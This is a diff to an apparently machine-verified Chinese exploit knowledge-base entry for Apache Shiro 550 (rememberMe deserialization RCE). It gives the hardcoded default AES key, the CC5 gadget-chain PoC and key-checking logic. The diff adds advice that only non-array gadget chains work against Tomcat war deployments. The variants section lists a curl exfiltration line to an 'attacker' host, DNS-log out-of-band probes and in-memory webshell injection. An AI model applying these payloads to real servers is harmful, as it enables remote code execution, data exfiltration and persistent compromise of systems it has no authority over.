@@ -25,12 +25,12 @@ severity: critical
 confidence: high
 status: verified
 created: '2026-11-05'
-updated: '2026-11-05'
+updated: '2026-11-13'
 affected_versions: Apache Shiro <= 1.2.4
 verification:
-  verified_by: verifier-V11
-  verified_at: '2026-11-05T01:49:06+08:00'
-  notes: 已修复 Base64 表述与 PoC 代码并复核：PoC 现为 Base64.getEncoder().encodeToString(encrypted) 单行，保留标准 +/ 与 = padding，已删除 -/_ 替换；结论与步骤5文字一致。AES-128-CBC/PKCS5、16字节IV||密文、默认密钥 kPH+bIxk5D2deZiIxcaaaA==、CookieRememberMeManager→convertBytesToPrincipals→DefaultSerializer.readObject、CC5 构造均与原文图2-20一致；影响版本 Shiro<=1.2.4 已设置。复核通过。
+  verified_by: verifier-V653-fix
+  verified_at: '2026-11-13T05:45:42+08:00'
+  notes: 依 12505 复验结论修正：①原理改为 ClassResolvingObjectInputStream（ClassLoader.loadClass，非 new ObjectInputStream/Class.forName）；②新增数组链限制：Tomcat war 本地 commons-collections 下 Transformer[] 链 ClassNotFoundException，非数组链（CC2/CC4/CB、单 InvokerTransformer 形式）可用；③PoC 与变体段标注数组形态前提。AES-CBC/IV 拼接/密钥判定/版本区间未动。
 ---
 
 ## 一句话结论
@@ -40,11 +40,12 @@ Shiro <= 1.2.4 的 `rememberMe` Cookie 是 `Base64(16字节IV + AES-128-CBC(PKCS
 ## 原理
 
 - `AbstractRememberMeManager.encrypt()` 每次生成 16 字节随机 IV，用 `AesCipherService`（AES-128-CBC + PKCS5Padding）加密序列化字节，再把 `IV || ciphertext` 拼接。
-- `CookieRememberMeManager` 把拼接结果 Base64 后写入 `rememberMe` Cookie；读取时 Base64 解码、取前 16 字节为 IV、其余为密文、AES 解密，最后交给 `DefaultSerializer.deserialize()`，内部直接 `new ObjectInputStream(bytes).readObject()`。
+- `CookieRememberMeManager` 把拼接结果 Base64 后写入 `rememberMe` Cookie；读取时 Base64 解码、取前 16 字节为 IV、其余为密文、AES 解密，最后交给 `DefaultSerializer.deserialize()`；它不使用原生 `ObjectInputStream`，而是 `ClassResolvingObjectInputStream`（重写 `resolveClass`，经 `ClassUtils.forName` → `ExceptionIgnoringAccessor.loadClass`，最终调用 `ClassLoader.loadClass` 而非 `Class.forName`）。
 - 密钥来自 `AbstractRememberMeManager` 构造器里的 `setCipherKey(DEFAULT_CIPHER_KEY_BYTES)`，该常量是 `Base64.decode("kPH+bIxk5D2deZiIxcaaaA==")`；1.2.4 之后改为要求开发者配置，未配置则随机生成。
 - 因为密钥固定且公开，攻击者可以自己完成加密；反序列化时 `readObject()` 递归实例化对象并调用其 `readObject`，触发 CommonsCollections 等 gadget 链。
 - 本文以 CC5 为例：`ConstantTransformer(Runtime.class)` → `InvokerTransformer("getMethod", ...)` → `InvokerTransformer("invoke", ...)` → `InvokerTransformer("exec", ...)`，用 `ChainedTransformer` 串联，`LazyMap` 包装，`TiedMapEntry` 作为入口，最后把 entry 反射塞进 `BadAttributeValueExpException.val`，使反序列化时通过 `toString()` 触发。
 - 密钥是否有效可用「解密后是否以 Java 序列化魔数 `AC ED 00 05` 开头」判定；对返回的 `rememberMe=deleteMe` 或任意 Cookie 尝试字典密钥即可。
+- **数组链限制**：`ClassResolvingObjectInputStream` 用 `ClassLoader.loadClass` 解析类名，数组类型（如 `[Lorg.apache.commons.collections.Transformer;`）只有在组件类对应用类加载器可见时才能解析。典型 Tomcat war 中 commons-collections 是 webapp 本地依赖，`web.xml` 的 webapp 类加载器只对 `java.*` 等回退父加载器，于是 `Transformer[]` 形态的链（数组版 CC5/CC1）会抛 `ClassNotFoundException: Unable to load ObjectStreamClass [[Lorg.apache.commons.collections.Transformer;`；容器 lib 可见 commons-collections（或使用单一 classloader 的可执行 jar）时数组链可用。不序列化数组的链（CC2/CC4、CommonsBeanutils、只含单个 `InvokerTransformer` 的 CC3.2.1 形式）不受此限制。
 
 ## 触发条件
 
@@ -64,7 +65,7 @@ Shiro <= 1.2.4 的 `rememberMe` Cookie 是 `Base64(16字节IV + AES-128-CBC(PKCS
 
 ## PoC
 
-CC5 链构造（原文手工版本）：
+CC5 链构造（原文手工版本；数组形态，要求 commons-collections 对应用类加载器父级可见，Tomcat war 本地依赖场景改用非数组链，见原理“数组链限制”）：
 
 ```java
 Transformer[] transformers = new Transformer[]{
@@ -110,7 +111,7 @@ assert plain.startswith(b"\xac\xed\x00\x05")
 
 ## 变体与关联
 
-- 载荷链变体：CommonsBeanutils1、CC6、JNDI 等；不同链对依赖/JDK 要求不同。
+- 载荷链变体：CommonsBeanutils1、CC6、JNDI 等；不同链对依赖/JDK 要求不同；war 部署下优先非数组链（数组链受 `ClassResolvingObjectInputStream` 类名解析限制）。
 - 无回显变体：`ping <token>.dnslog.cn`、`curl http://attacker/?x=$(whoami|base64)`、URLDNS 探测。
 - 内存马变体：在链尾注入 Filter/Servlet 内存马，避免落地文件。
 - 关联：[[web-java-framework-shiro-550-hardcoded-key-deserialization]]（同一漏洞的概览与工具利用）；[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（CC 链细节）。
